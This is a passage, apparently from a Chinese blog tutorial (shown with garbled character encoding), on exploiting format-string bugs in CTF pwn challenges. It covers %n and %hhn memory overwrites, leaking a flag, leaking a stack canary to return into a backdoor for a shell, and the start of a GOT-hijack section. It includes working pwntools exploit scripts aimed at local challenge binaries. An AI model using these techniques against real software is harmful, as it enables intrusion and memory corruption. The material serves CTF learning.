title="è¦†ç›–å°æ•°å­—"></a>è¦†ç›–å°æ•°å­—</h5><p>è¿™ä¸ªå°æ˜¯ä»€ä¹ˆå°å‘¢ï¼Œæ˜¯å°äºæœºå™¨å­—é•¿çš„æ•°å­—ã€‚æ‹¿2ä¸¾ä¾‹å­ï¼Œå¦‚æœæˆ‘æƒ³å‘å˜é‡ä¸­å­˜ä¸€ä¸ª2ï¼Œé‚£å°±ä¼šå‡ºç°é—®é¢˜ï¼Œå›æƒ³ä¸€ä¸‹åˆšåœ¨æˆ‘ä»¬åšçš„ä¾‹å­ï¼Œ%nä¼šå°†å‰é¢è¾“å…¥çš„å­—èŠ‚æ•°å­˜æ”¾åˆ°æŒ‡å®šçš„å‚æ•°åœ°å€ä¸­ã€‚ä½†æ˜¯æˆ‘ä»¬å°†åœ°å€æ”¾åœ¨æœ€å‰é¢ï¼Œé‚£ä¹ˆç»è¿‡p32å°ç«¯åºè½¬åŒ–ä¹‹ååœ°å€æœ¬èº«å°±ä¼šå 4ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ç»è¿‡%nå­˜æ”¾çš„æ—¶å€™ï¼Œå‘å˜é‡ä¸­å†™çš„æ•°ä¸€å®šæ˜¯å¤§äºç­‰äº4çš„ï¼Œé‚£è¿™æ ·ä¸€æ¥æˆ‘ä»¬æƒ³å‘å˜é‡ä¸­å­˜æ”¾2çš„æƒ³æ³•å¯èƒ½å°±è¦ç ´ç­äº†ã€‚æˆ‘ä»¬æ‹¿a = 2ä¸¾ä¾‹ï¼Œä½¿ç¨‹åºè¾“å‡ºå­—ç¬¦ä¸²â€œmodified a for a small number.â€<br>ä½†æ˜¯æˆ‘ä»¬æƒ³ä¸€æƒ³ï¼Œåœ°å€ä¸€å®šè¦æ”¾åœ¨æœ€å‰é¢å—ï¼Œæˆ‘ä»¬çš„%næ˜¯å¯ä»¥å‘æŒ‡å®šçš„å‚æ•°åœ°å€å†™å…¥æ•°å­—çš„ï¼Œæ‰€ä»¥æŠŠåŸæœ‰çš„payloadè¯¥ä¸€ä¸‹ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#39;aa%k&#39; + &#39;$naa&#39; +p32(a_addr)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>æˆ‘ä»¬æŠŠå‰é¢çš„å­—ç¬¦ä¸²æ‹†åˆ†æˆä¸¤éƒ¨åˆ†ï¼Œæ¯ä¸ªéƒ¨åˆ†å››ä¸ªå­—èŠ‚ï¼Œå› ä¸ºå˜é‡æ˜¯ä»ç¬¬å…­ä¸ªå‚æ•°å¼€å§‹çš„ï¼Œæ‰€ä»¥aa%kæ˜¯ç¬¬6ä¸ªã€$naaæ˜¯ç¬¬7ä¸ªã€p32(a_addr)æ˜¯ç¬¬8ä¸ªï¼Œæ‰€ä»¥kéœ€è¦æ”¹æˆ8ï¼Œè¿™æ ·%nå°±ä¼šå°†â€œaaâ€è¿™ä¸¤ä¸ªå­—ç¬¦çš„å­—ç¬¦æ•°2å†™åœ¨ç¬¬8ä¸ªå‚æ•°ï¼Œå³å˜é‡açš„åœ°å€ä¸­ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#39;aa%8&#39; + &#39;$naa&#39; +p32(a_addr)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>é‚£ä¹ˆè¿™æ ·ä¸€æ¥åç§»æ‰¾åˆ°äº†ï¼Œå‰©ä¸‹çš„å°±æ˜¯å˜é‡açš„åœ°å€äº†ï¼Œå› ä¸ºaå·²ç»è¿›è¡Œè¿‡åˆå§‹åŒ–äº†ï¼Œæ‰€ä»¥ä½¿ç”¨idaå¯ä»¥åœ¨.dataæ®µæ‰¾åˆ°ï¼š<br>![[Pasted image 20250211154330.png]]<br>expå¦‚ä¸‹ï¼š<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *sh &#x3D; process(&#39;.&#x2F;overwrite&#39;)a_addr &#x3D; 0x0804A024payload &#x3D; &#39;aa%8$naa&#39; + p32(a_addr)sh.sendline(payload)print sh.recv()sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>![[Pasted image 20250211154405.png]]</p><h5 id="è¦†ç›–å¤§æ•°å­—"><a href="#è¦†ç›–å¤§æ•°å­—" class="headerlink" title="è¦†ç›–å¤§æ•°å­—"></a>è¦†ç›–å¤§æ•°å­—</h5><p>åˆ°è¿™é‡Œä¸ºæ­¢ï¼Œåº”è¯¥å¯¹<code>%k$n</code>æœ‰ä¸€å®šçš„äº†è§£äº†ï¼Œè¿˜æ˜¯é‚£ä¸ªåŸåˆ™ï¼Œ%k$nå‰é¢æœ‰å¤šå°‘ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆå°±ä¼šå‘ç¬¬kä¸ªå‚æ•°åœ°å€ä¸­å†™å¤šå°‘ã€‚é‚£ä¹ˆå›æ¥ï¼Œè¦†ç›–å¤§æ•°å­—èƒ½æœ‰å¤šå¤§å‘¢ï¼Ÿæ‹¿b = 0x12345678ä¸¾ä¾‹ï¼Œæ¢æˆåè¿›åˆ¶çš„è¯å°±æ˜¯305419896ä¸ªå­—èŠ‚ï¼Œè¿™å°±å·²ç»éå¸¸å¤§äº†ï¼Œæˆ‘ä»¬æ²¡æ³•æ„å»ºä¸€ä¸ªè¶…çº§é•¿çš„payloadçš„æ’å…¥æ ˆä¸­ï¼Œå› ä¸ºæ ˆçš„é•¿åº¦å¯èƒ½éƒ½æ²¡æœ‰è¿™ä¹ˆé•¿ğŸ˜</p><p>é‚£ä¹ˆæˆ‘ä»¬æ”¹å˜ä¸€ä¸‹æ€è·¯ï¼Œæˆ‘ä»¬ä¸€å®šè¦ä¸€æ¬¡æ€§å†™å…¥0x12345678å—ï¼Ÿå­˜æ”¾å˜é‡bçš„åœ°å€ç©ºé—´æœ‰4ä¸ªå­—èŠ‚ï¼š<br>![[Pasted image 20250211154435.png]]<br>å› ä¸ºåœ¨x86ã€x64ä¸­æ—¶æŒ‰ç…§å°ç«¯åºçš„å½¢å¼å­˜å‚¨çš„ï¼Œæ‰€ä»¥ä»¥b_addrä½œä¸ºåŸºåœ°å€å¼€å§‹ï¼Œä¾æ¬¡ä»å³å‘å·¦åœ¨æ¯ä¸ªå­—èŠ‚ä¸­å†™å…¥å†…å®¹ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¸å¿…é¡»ä¸€æ¬¡æ€§å°†å˜é‡bçš„æ‰€æœ‰ä½ç½®å¡«æ»¡ï¼Œå¯ä»¥ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚çš„å¡«å……ã€‚è¿™æ ·å¡«å……çš„æ–¹æ³•å°±ç”¨åˆ°äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²é‡Œé¢çš„ä¸¤ä¸ªæ ‡å¿—ä½äº†ï¼š</p><blockquote><p>hï¼šå¯¹äºæ•´æ•°ç±»å‹ï¼Œprintf æœŸå¾…ä¸€ä¸ªä» short æå‡çš„ int å°ºå¯¸çš„æ•´å‹å‚æ•°<br>hhï¼šå¯¹äºæ•´å‹ç±»å‹ï¼Œprintf æœŸå¾…ä¸€ä¸ªä» char æå‡çš„ int å°ºå¯¸çš„æ•´å½¢å‚æ•°</p></blockquote><p>å®šä¹‰å¾ˆå¤æ‚ï¼Œç®€å•ç‚¹è¯´å¦‚æœæˆ‘ä»¬ä½¿ç”¨äº†hæ ‡å¿—ä½ï¼Œé‚£ä¹ˆå°±ä¼šå‘å˜é‡bä¸­ä¸€æ¬¡æ€§å†™ä¸¤ä¸ªå­—èŠ‚ï¼Œå†™ä¸¤æ¬¡å¡«æ»¡ã€‚ä½¿ç”¨hhæ ‡å¿—ä½ä¼šå‘å˜é‡bä¸­ä¸€æ¬¡æ€§å†™ä¸€ä¸ªå­—èŠ‚ï¼Œå†™å››æ¬¡å¡«æ»¡ã€‚é‚£ä¹ˆæˆ‘ä»¬å»æƒ³ï¼Œå¦‚æœå°†b_addræ”¾åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬å…­ä¸ªå‚æ•°ä½ç½®ã€b_addr + 1æ”¾åœ¨ç¬¬7ä¸ªå‚æ•°ä½ç½®ã€b_addr + 2æ”¾åœ¨ç¬¬8ä¸ªå‚æ•°ä½ç½®ã€b_addr + 3æ”¾åœ¨ç¬¬9ä¸ªå‚æ•°ä½ç½®ã€‚å†é€šè¿‡<code>%6$hhn</code>ã€<code>%7$hhn</code>ã€<code>%8$hhn</code>ã€<code>%9$hhn</code>å°†0x78ã€0x56ã€0x34ã€0x12å†™è¿›å»æ˜¯ä¸æ˜¯å°±å¯ä»¥äº†ï¼<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload &#x3D; p32(b_addr)+p32(b_addr+1)+p32(b_addr+2)+p32(b_addr+3)payload +&#x3D; &#39;%104x&#39;+&#39;%6$hhn&#39;+&#39;%222x&#39;+&#39;%7$hhn&#39;+&#39;%222x&#39;+&#39;%8$hhn&#39;+&#39;%222x&#39;+&#39;%9$hhn&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><ul><li>å‰é¢çš„å››ä¸ªp32æ¯ä¸ªå 4å­—èŠ‚ï¼Œä¸€å…±16ä¸ªå­—èŠ‚ï¼Œ%104xå 104ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥104 + 16 = 120 =0x78ï¼Œæ‰€ä»¥%6$hhnä¼šå°†0x78å†™åˆ°ç¬¬6ä¸ªå‚æ•°ï¼Œå³p32(b_addr)çš„ä½ç½®</li><li>%222xå 222ä¸ªå­—èŠ‚ï¼Œå†åŠ ä¸Šå‰é¢çš„å­—èŠ‚æ•°ï¼š120 + 222 = 342 = 0x156ï¼Œå› ä¸ºhhæ˜¯å•å­—ï¼Œæ‰€ä»¥åªå–åé¢çš„0x56ï¼Œæ‰€ä»¥%7$hhnä¼šå°†0x56å†™åˆ°ç¬¬7ä¸ªå‚æ•°ï¼Œå³p32(b_addr + 1)çš„ä½ç½®</li><li>%222xå 222ä¸ªå­—èŠ‚ï¼Œå†åŠ ä¸Šå‰é¢çš„å­—èŠ‚æ•°ï¼š342 + 222 = 564 = 0x234ï¼Œå› ä¸ºhhæ˜¯å•å­—ï¼Œæ‰€ä»¥åªå–åé¢çš„0x34ï¼Œæ‰€ä»¥%8$hhnä¼šå°†0x34å†™åˆ°ç¬¬8ä¸ªå‚æ•°ï¼Œå³p32(b_addr + 2)çš„ä½ç½®</li><li>%222xå 222ä¸ªå­—èŠ‚ï¼Œå†åŠ ä¸Šå‰é¢çš„å­—èŠ‚æ•°ï¼š564 + 222 = 0x312ï¼Œå› ä¸ºhhæ˜¯å•å­—ï¼Œæ‰€ä»¥åªå–åé¢çš„0x12ï¼Œæ‰€ä»¥%9$hhnä¼šå°†0x12å†™åˆ°ç¬¬9ä¸ªå‚æ•°ï¼Œå³p32(b_addr + 3)çš„ä½ç½®<br>è¿™æ ·ä¸€æ¥æˆ‘ä»¬å°±å®Œæˆäº†å¯¹å˜é‡bå››ä¸ªå­—èŠ‚çš„å¡«å……ï¼Œå¡«å……ä¹‹åb = 0x12345678ï¼Œå‰©ä¸‹çš„å°±æ˜¯å¯»æ‰¾bçš„åœ°å€äº†ï¼Œä¾ç„¶è¿˜æ˜¯ä½¿ç”¨idaåœ¨.dataé‡Œé¢æ‰¾åˆ°bçš„åœ°å€ï¼š<br>![[Pasted image 20250211162441.png]]<br>è¿™æ ·ä¸€æ¥b_addr = 0x0804A028<br>expå¦‚ä¸‹ï¼š<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *sh &#x3D; process(&#39;.&#x2F;overwrite&#39;)b_addr&#x3D;0x0804A028payload &#x3D; p32(b_addr)+p32(b_addr+1)+p32(b_addr+2)+p32(b_addr+3)payload +&#x3D; &#39;%104x&#39;+&#39;%6$hhn&#39;+&#39;%222x&#39;+&#39;%7$hhn&#39;+&#39;%222x&#39;+&#39;%8$hhn&#39;+&#39;%222x&#39;+&#39;%9$hhn&#39;sh.sendline(payload)#sh.sendline(fmtstr_payload(6, &#123;0x804A028:0x12345678&#125;))print sh.recv()sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>ç»“æœå¦‚ä¸‹ï¼Œä¼šçœ‹åˆ°ç¨‹åºæ‰“å°å­—ç¬¦ä¸²â€œmodified b for a big number!â€<br>![[Pasted image 20250211162513.png]]</li></ul><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><h3 id="ä¾‹-1-x64"><a href="#ä¾‹-1-x64" class="headerlink" title="ä¾‹(1) x64"></a>ä¾‹(1) x64</h3><blockquote><p>ubuntu24.04è¿è¡Œä¸äº†ï¼ŒæŠ„çš„åˆ«çš„å¸ˆå‚…çš„<br>64ä½æ ¼å¼åŒ–å­—ç¬¦ä¸²å’Œ32ä½çš„å¾ˆç›¸ä¼¼ï¼Œåšé¢˜çš„æ­¥éª¤ä¹Ÿç›¸åŒï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯64ä½ç¨‹åºå¯¹å‡½æ•°å‚æ•°å­˜å‚¨çš„æ–¹å¼å’Œ32ä½çš„ä¸åŒã€‚64ä¸ºç¨‹åºä¼šä¼˜å…ˆå°†å‡½æ•°çš„å‰6ä¸ªå‚æ•°æ”¾ç½®åœ¨å¯„å­˜å™¨ä¸­ï¼Œè¶…è¿‡6ä¸ªçš„å†å­˜æ”¾åœ¨æ ˆä¸Šï¼Œè€Œ32ä½ç›´æ¥å­˜æ”¾åœ¨æ ˆä¸Šã€‚</p></blockquote><p>![[Pasted image 20250211225455.png]]<br>![[Pasted image 20250211230001.png]]<br>ä½¿ç”¨gdbæ‰“å¼€ä¸€ä¸‹ï¼Œä¾ç„¶è¿˜æ˜¯åœ¨printfå¤„ä¸‹æ–­ç‚¹<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; b printfBreakpoint 1 at 0x400640pwndbg&gt; rStarting program: &#x2F;home&#x2F;hollk&#x2F;ctf-challenges&#x2F;pwn&#x2F;fmtstr&#x2F;2017-UIUCTF-pwn200-GoodLuck&#x2F;goodluck what&#39;s the flaghollk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>![[Pasted image 20250211225615.png]]<br>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åœåœ¨äº†printfå‡½æ•°å¤„ã€‚64ä½ç¨‹åºéœ€è¦å…ˆå¾€å¯„å­˜å™¨ä¸Šçœ‹ï¼Œå› ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ä½œä¸ºprintfå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ‰€ä»¥ç†æ‰€åº”å½“çš„å­˜æ”¾åœ¨rdiå¯„å­˜å™¨ä¸­ï¼Œå‰©ä¸‹çš„RSIã€RDXã€RCXã€R8ã€R9è¿™5ä¸ªå¯„å­˜å™¨ä¼šæ¥ç€å­˜æ”¾å…¶ä»–å‚æ•°ã€‚ä¸Šé¢çœ‹å®Œäº†å¾€æ ˆä¸Šçœ‹ï¼Œå¯ä»¥çœ‹åˆ°æ ˆé¡¶ä¸ºprintfå‡½æ•°çš„è¿”å›åœ°å€ï¼Œæˆ‘ä»¬æƒ³è¦çš„flagåœ¨è¿”å›åœ°å€ä¸‹çš„ç¬¬å››ä¸ªã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³è¦æ‰“å°flagï¼Œé‚£ä¹ˆflagè·ç¦»æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»å°±æ˜¯5 + 4 = 9</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *sh &#x3D; process(&#39;.&#x2F;goodluck&#39;)payload &#x3D; &quot;%9$s&quot;#gdb.attach(sh)sh.sendline(payload)sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>![[Pasted image 20250211230103.png]]</p><h3 id="ä¾‹-2-ç»•è¿‡Canary"><a href="#ä¾‹-2-ç»•è¿‡Canary" class="headerlink" title="ä¾‹(2) ç»•è¿‡Canary"></a>ä¾‹(2) ç»•è¿‡Canary</h3><blockquote><p><a href="https://pan.baidu.com/s/1hVMiXkKJQoiEbYMpPJfsAg">https://pan.baidu.com/s/1hVMiXkKJQoiEbYMpPJfsAg</a><br>æå–ç :4egx</p></blockquote><p>èµ°ä¸€å¥—æµç¨‹<br>![[Pasted image 20250212125542.png]]<br>32ä½æ–‡ä»¶ï¼Œå¼€å¯äº†NXå’ŒCanaryä¿æŠ¤</p><blockquote><p>Canaryç®€ä»‹ï¼šCanaryæ˜¯ä¸€ç§ç”¨æ¥é˜²æŠ¤æ ˆæº¢å‡ºçš„ä¿æŠ¤æœºåˆ¶ã€‚å…¶åŸç†æ˜¯åœ¨ä¸€ä¸ªå‡½æ•°çš„å…¥å£å¤„ï¼Œå…ˆä»fs/gså¯„å­˜å™¨ä¸­å–å‡ºä¸€ä¸ª4å­—èŠ‚(eax)æˆ–è€…8å­—èŠ‚(rax)çš„å€¼å­˜åˆ°æ ˆä¸Šï¼ˆæœ€ä½ä½éƒ½æ˜¯\x00ï¼‰ï¼Œå½“å‡½æ•°ç»“æŸæ—¶ä¼šæ£€æŸ¥è¿™ä¸ªæ ˆä¸Šçš„å€¼æ˜¯å¦å’Œå­˜è¿›å»çš„å€¼ä¸€è‡´ï¼Œè‹¥ä¸€è‡´åˆ™æ­£å¸¸é€€å‡ºï¼Œå¦‚æœæ˜¯æ ˆæº¢å‡ºæˆ–è€…å…¶ä»–åŸå› å¯¼è‡´Canaryçš„å€¼å‘ç”Ÿå˜åŒ–ï¼Œé‚£ä¹ˆç¨‹åºå°†æ‰§è¡Œ<code>___stack_chk_fail</code>å‡½æ•°ï¼Œç»§è€Œç»ˆæ­¢ç¨‹åºã€‚</p><h2 id="æ‰€ä»¥å¦‚æœæœ‰ä¸€é“é¢˜å¼€å¯äº†canaryä¿æŠ¤ï¼Œä½†ä¸çŸ¥é“canaryçš„å€¼ï¼Œå°±ä¸èƒ½å¤Ÿè¿›è¡ŒROPæ¥åŠ«æŒç¨‹åºæµç¨‹ï¼Œé‚£ä¹ˆè¿™é“é¢˜å°±æ— æ³•è§£å†³äº†ã€‚"><a href="#æ‰€ä»¥å¦‚æœæœ‰ä¸€é“é¢˜å¼€å¯äº†canaryä¿æŠ¤ï¼Œä½†ä¸çŸ¥é“canaryçš„å€¼ï¼Œå°±ä¸èƒ½å¤Ÿè¿›è¡ŒROPæ¥åŠ«æŒç¨‹åºæµç¨‹ï¼Œé‚£ä¹ˆè¿™é“é¢˜å°±æ— æ³•è§£å†³äº†ã€‚" class="headerlink" title="æ‰€ä»¥å¦‚æœæœ‰ä¸€é“é¢˜å¼€å¯äº†canaryä¿æŠ¤ï¼Œä½†ä¸çŸ¥é“canaryçš„å€¼ï¼Œå°±ä¸èƒ½å¤Ÿè¿›è¡ŒROPæ¥åŠ«æŒç¨‹åºæµç¨‹ï¼Œé‚£ä¹ˆè¿™é“é¢˜å°±æ— æ³•è§£å†³äº†ã€‚"></a>æ‰€ä»¥å¦‚æœæœ‰ä¸€é“é¢˜å¼€å¯äº†canaryä¿æŠ¤ï¼Œä½†ä¸çŸ¥é“canaryçš„å€¼ï¼Œå°±ä¸èƒ½å¤Ÿè¿›è¡ŒROPæ¥åŠ«æŒç¨‹åºæµç¨‹ï¼Œé‚£ä¹ˆè¿™é“é¢˜å°±æ— æ³•è§£å†³äº†ã€‚</h2><p>Canaryç»•è¿‡æ–¹å¼ä¸€èˆ¬canaryæœ‰ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼š<br>1.çˆ†ç ´canary<br>2.å¦‚æœå­˜åœ¨å­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´å¯ä»¥è¾“å‡ºcanaryå¹¶åˆ©ç”¨æº¢å‡ºè¦†ç›–canaryä»è€Œè¾¾åˆ°ç»•è¿‡</p><h2 id="è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨ç¬¬äºŒç§åˆ©ç”¨æ–¹æ³•ï¼šprintfå±äºå¯å˜å‚æ•°å‡½æ•°ï¼Œå‡½æ•°è°ƒç”¨è€…å¯ä»»æ„æŒ‡å®šå‚æ•°å’Œæ•°é‡ï¼Œè¿™ä¹Ÿæ˜¯æ¼æ´äº§ç”Ÿçš„åŸå› ã€‚"><a href="#è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨ç¬¬äºŒç§åˆ©ç”¨æ–¹æ³•ï¼šprintfå±äºå¯å˜å‚æ•°å‡½æ•°ï¼Œå‡½æ•°è°ƒç”¨è€…å¯ä»»æ„æŒ‡å®šå‚æ•°å’Œæ•°é‡ï¼Œè¿™ä¹Ÿæ˜¯æ¼æ´äº§ç”Ÿçš„åŸå› ã€‚" class="headerlink" title="è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨ç¬¬äºŒç§åˆ©ç”¨æ–¹æ³•ï¼šprintfå±äºå¯å˜å‚æ•°å‡½æ•°ï¼Œå‡½æ•°è°ƒç”¨è€…å¯ä»»æ„æŒ‡å®šå‚æ•°å’Œæ•°é‡ï¼Œè¿™ä¹Ÿæ˜¯æ¼æ´äº§ç”Ÿçš„åŸå› ã€‚"></a>è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨ç¬¬äºŒç§åˆ©ç”¨æ–¹æ³•ï¼šprintfå±äºå¯å˜å‚æ•°å‡½æ•°ï¼Œå‡½æ•°è°ƒç”¨è€…å¯ä»»æ„æŒ‡å®šå‚æ•°å’Œæ•°é‡ï¼Œè¿™ä¹Ÿæ˜¯æ¼æ´äº§ç”Ÿçš„åŸå› ã€‚</h2></blockquote><p>è¿›IDAçœ‹ä¸€ä¸‹mainå‡½æ•°å¼€å¤´å’Œç»“å°¾çš„æ±‡ç¼–<br>![[Pasted image 20250212130000.png]]<br>![[Pasted image 20250212130035.png]]<br>ä»¥ä¸Šè¯å®äº†ç¨‹åºå¼€å¯äº†Canaryä¿æŠ¤<br>![[Pasted image 20250212130133.png]]<br>å†çœ‹ä¸€ä¸‹ä¼ªä»£ç <br>![[Pasted image 20250212130229.png]]<br>å‘ç°äº†printf(æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´)å’Œæ˜“å¯¼è‡´æ ˆæº¢å‡ºçš„å‡½æ•°gets<br>åŒæ—¶å‘ç°åé—¨<br>![[Pasted image 20250212130214.png]]<br>å¤§è‡´è§£é¢˜æ€è·¯å¦‚ä¸‹ï¼š<strong>è¦†ç›–è‡³mainå‡½æ•°çš„Cananryå¤„ï¼Œå¡«ä¸Šæ­£ç¡®çš„Canaryï¼Œç„¶åè¦†ç›–è¿”å›åœ°å€ä¸ºåé—¨å‡½æ•°å¤„ï¼Œå³å¯æ‹¿åˆ°shell</strong><br>æ ¹æ®æ±‡ç¼–å¯çŸ¥å¯„å­˜å™¨edxé‡Œå­˜çš„å°±æ˜¯Canaryçš„å€¼<br>æˆ‘ä»¬åœ¨printfå’Œmainå‡½æ•°æœ«å°¾çš„xorä¸‹æ–­ç‚¹</p><p>![[Pasted image 20250212132656.png]]<br>0xffffc620ä¸ºformatåœ¨stackä¸­çš„ä½ç½®<br>![[Pasted image 20250212132542.png]]<br>EDXçš„å€¼å°±æ˜¯Canaryçš„å€¼<br>![[Pasted image 20250212132749.png]]<br>çœ‹å†…å­˜ï¼ŒCanaryçš„å€¼ä¸formatç›¸è·15<br>Canaryçš„åç§»ä¸º15ï¼Œè¿™æ ·æˆ‘ä»¬åœ¨ç¬¬ä¸€æ¬¡getsæ—¶å‘é€<code>%15$x</code>å°±ä¼šï¼ˆprintf)æ³„éœ²å‡ºcanary<br>çš„å€¼</p><blockquote><p><code>%s</code>ï¼šè¾“å‡ºçš„å†…å®¹æ˜¯å­—ç¬¦ä¸²ï¼Œå³å°†åç§»å¤„æŒ‡é’ˆæŒ‡å‘çš„å­—ç¬¦ä¸²è¾“å‡ºï¼Œå¦‚%i$sè¡¨ç¤ºè¾“å‡ºåç§»iå¤„åœ°å€æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œåœ¨32bitå’Œ64bitç¯å¢ƒä¸‹ä¸€æ ·ï¼Œå¯ç”¨äºè¯»å–GOTè¡¨ç­‰ä¿¡æ¯ã€‚</p></blockquote><p>ç„¶åæˆ‘ä»¬ç¡®å®šgetsåˆ°Canaryçš„åç§»<br>![[Pasted image 20250212133441.png]]<br>ç”±å‰é¢åˆ†æå¯çŸ¥v5é‡Œå°±æ˜¯Canaryçš„å€¼<br>åœ¨IDAä¸­æŸ¥çœ‹å¯çŸ¥såˆ°v5çš„åç§»ä¸º0x2c-0x04=40<br><strong><em>EBPä¸‹é¢ä¸ºreturn_address</em></strong><br>![[Pasted image 20250212134019.png]]<br>canaryåœ¨[ESP+0x3c]=0xffffc65cï¼ŒEBPåœ¨0xffffc668ï¼Œç›¸å‡ç­‰äº12<br>å®Œæˆå¦‚ä¸‹exp<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *p &#x3D; process(&#39;.&#x2F;binary_200&#39;) sys &#x3D; 0x0804854dp.sendline(&#39;%15$x&#39;)Canary &#x3D; int(p.recv(),16)   print(&#39;Canary:&#39;,hex(Canary))payload&#x3D;b&#39;a&#39;*40+p32(Canary)+b&#39;a&#39;*12+p32(sys)p.sendline(payload)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>![[Pasted image 20250212135349.png]]<br>åŒæ—¶å¯ä»¥çœ‹å‡ºCanaryæ˜¯å˜åŒ–çš„<br><strong><em>getshell</em></strong></p><h3 id="ä¾‹-3-hijack-GOT"><a href="#ä¾‹-3-hijack-GOT" class="headerlink" title="ä¾‹(3) hijack GOT"></a>ä¾‹(3) hijack GOT</h3><blockquote><p><a href="https://pan.baidu.com/s/1H9AVH4wXct8gxkf9GV0YWA">https://pan.baidu.com/s/1H9AVH4wXct8gxkf9GV0YWA</a><br>æå–ç ï¼š140h</p><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>ç°åœ¨çš„Cç¨‹åºä¸­ï¼Œlibcçš„å‡½æ•°æ˜¯é€šè¿‡GOTè¡¨æ¥å®ç°è·³è½¬çš„ã€‚åœ¨æ²¡æœ‰å¼€å¯RELRO(æˆ–å¼€å¯Partial RELROï¼‰ä¿æŠ¤çš„å‰æä¸‹ï¼Œæ¯ä¸ªlibcçš„å‡½æ•°å¯¹åº”çš„GOTè¡¨é¡¹æ˜¯å¯ä»¥è¢«ä¿®æ”¹çš„ã€‚å› æ­¤ä¿®æ”¹æŸä¸ªlibcå‡½æ•°çš„GOTè¡¨å†…å®¹ä¸ºå¦ä¸€ä¸ªlibcå‡½æ•°çš„åœ°å€æ¥å®ç°å¯¹ç¨‹åºçš„æ§åˆ¶ã€‚<br>å‡è®¾æˆ‘ä»¬å°†å‡½æ•°Açš„åœ°å€è¦†ç›–ä¸ºå‡½æ•°Bçš„åœ°å€ï¼Œé‚£ä¹ˆè¿™ä¸€æ”»å‡»æŠ€å·§å¯ä»¥åˆ†ä¸ºä»¥ä¸‹æ­¥éª¤</p><ul><li>ç¡®å®šå‡½æ•°Açš„GOTè¡¨åœ°å€<br>  ä¸»è¦åˆ©ç”¨å‡½æ•°Aä¸€èˆ¬åœ¨ç¨‹åºä¸­å·²æœ‰ï¼Œæ‰€ä»¥å¯ä»¥é‡‡ç”¨ç®€å•çš„å¯»æ‰¾åœ°å€çš„æ–¹æ³•æ¥æ‰¾</li><li>ç¡®å®šå‡½æ•°Bçš„å†…å­˜åœ°å€<br>  éœ€è¦æƒ³åŠæ³•æ³„éœ²å¯¹åº”å‡½æ•°Bçš„åœ°å€</li><li>å°†å‡½æ•°Bçš„å†…å­˜å†™å…¥åˆ°å‡½æ•°Açš„GOTè¡¨åœ°å€å¤„<br>  éœ€è¦åˆ©ç”¨å‡½æ•°çš„æ¼æ´æ¥è§¦å‘<pre><code>  å†™å…¥å‡½æ•°ï¼šwriteå‡½æ•°  ROP  - `pop eax; ret; # printf@got -&gt; eax`  - ` pop ebx; ret; # (addr_offset = system_addr - printf_addr) -&gt; ebx`  - `add [eax] ebx; ret; # [printf@got] = [printf@got] + addr_offset`  æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»»æ„åœ°å€å†™</code></pre><h4 id="å®æ“"><a href="#å®æ“" class="headerlink" title="å®æ“"></a>å®æ“</h4>![[Pasted image 20250212140021.png]]<br>32ä½ï¼Œåªå¼€å¯äº†NX(æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤)<h5 id="æŸ¥çœ‹æ–‡ä»¶æ‰§è¡Œæµç¨‹"><a href="#æŸ¥çœ‹æ–‡ä»¶æ‰§è¡Œæµç¨‹" class="headerlink" title="æŸ¥çœ‹æ–‡ä»¶æ‰§è¡Œæµç¨‹"></a>æŸ¥çœ‹æ–‡ä»¶æ‰§è¡Œæµç¨‹</h5>![[Pasted image 20250212164428.png]]<br>![[Pasted image 20250212164533.png]]<br>![[Pasted image 20250212164645.png]]<br>![[Pasted image 20250212164657.png]]<br>![[Pasted image 